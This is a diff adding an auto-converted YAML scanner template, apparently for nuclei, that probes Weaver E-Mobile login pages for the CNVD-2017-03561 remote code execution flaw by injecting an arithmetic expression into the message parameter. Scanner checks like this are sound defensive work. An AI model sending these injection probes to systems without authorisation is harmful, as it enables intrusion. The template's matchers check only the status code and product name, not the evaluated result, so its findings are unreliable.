@@ -1,0 +1,36 @@
+id: yaml-poc-weaver-weaver_e_mobile-rce-CNVD-2017-03561
+info:
+  name: Yaml Poc Weaver Weaver_E_Mobile Rce Cnvd 2017 03561
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_mobile-rce-CNVD-2017-03561'
+  tags: rce
+  reference:
+  - https://vul.wangan.com/a/CNVD-2017-03561
+http:
+- method: GET
+  path:
+  - /login.do?message={{r1}}*{{r2}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - Weaver E-mobile
+- method: GET
+  path:
+  - /manager/login.do?message={{r1}}*{{r2}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - Weaver E-mobile
